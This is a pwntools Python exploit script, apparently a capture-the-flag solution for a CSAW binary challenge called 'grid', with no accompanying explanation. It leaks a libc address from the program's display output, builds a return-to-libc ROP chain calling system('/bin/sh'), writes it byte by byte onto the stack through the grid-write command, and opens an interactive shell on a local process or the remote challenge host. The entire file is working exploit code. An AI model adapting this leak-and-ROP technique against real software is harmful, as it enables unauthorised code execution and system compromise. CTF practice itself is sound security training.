#!/usr/bin/env -S python3

from pwn import *

binary = context.binary = ELF('./grid')
context.log_level = 'INFO'

libpath = os.getcwd() + '/libc-database/libs/libc6_2.27-3ubuntu1.2_amd64/'
libc = ELF(libpath + 'libc-2.27.so')
libc.symbols['base_offset'] = 0x4ec5da

if not args.REMOTE:
	context.log_file = 'local.log'
	ld = ELF(libpath + 'ld-2.27.so')
	p = process([ld.path, binary.path], env={'LD_LIBRARY_PATH':libpath, 'LD_PRELOAD':'./libstdc.so.6.0.25'})
else:
	context.log_file = 'remote.log'
	p = remote('pwn.chal.csaw.io', 5013)

p.sendlineafter('shape> ','d')
p.recvuntil('Displaying')
_ = p.recvuntil('shape').replace(b'shape',b'').strip().replace(b'\n',b'')
a = [_[i:i+8] for i in range(0,len(_),8)][:-1]
#for i in a: log.info(hex(u64(i)))
libc.address = u64(a[3]) - libc.sym.base_offset
log.info('libc.address: ' + hex(libc.address))

rop = ROP([libc])
pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]

payload  = b''
payload += p64(pop_rdi + 1)
payload += p64(pop_rdi)
payload += p64(libc.search(b'/bin/sh').__next__())
payload += p64(libc.sym.system)

base=120
for i in range(len(payload)):
	p.sendlineafter('> ',p8(payload[i]) + b' 0 ' + str(base + i).encode())

p.sendlineafter('shape> ','d')
p.recvuntil('Displaying\n')
p.recv(100 + 10)
p.interactive()
